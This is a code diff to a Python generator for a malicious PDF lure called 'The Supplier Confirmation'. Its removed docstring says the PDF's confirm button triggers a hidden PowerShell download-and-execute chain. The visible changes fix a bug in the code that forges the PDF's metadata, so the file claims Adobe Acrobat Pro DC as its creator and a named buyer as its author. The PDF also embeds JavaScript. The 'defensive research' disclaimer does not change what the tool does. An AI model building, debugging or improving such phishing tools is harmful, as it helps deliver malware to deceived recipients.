@@ -5,8 +5,6 @@
 V303 "THE SUPPLIER CONFIRMATION" – NO EMAIL PROMPT
 ================================================================================
 (c) 2026 The Architect. For Educational and Defensive Research Only.
-Generates a professional two‑page PDF with a confirm button that triggers
-a hidden PowerShell download/execute chain.
 ================================================================================
 """
 
@@ -317,9 +315,10 @@ def build_supplier_confirmation(output_path, exe_url, fallback_url, buyer, suppl
         "/JS": String(browser_js)
     })
 
-    pdf.doc_info["/Title"] = String(f"Customization Requirements – {product} (v{version})")
-    pdf.doc_info["/Author"] = String(buyer)
-    pdf.doc_info["/Creator"] = String("Adobe Acrobat Pro DC")
+    # FIXED: use docinfo (not doc_info)
+    pdf.docinfo["/Title"] = String(f"Customization Requirements – {product} (v{version})")
+    pdf.docinfo["/Author"] = String(buyer)
+    pdf.docinfo["/Creator"] = String("Adobe Acrobat Pro DC")
 
     pdf.save(output_path, compress_streams=False)
     logger.info(f"[!] PDF generated: {output_path}")
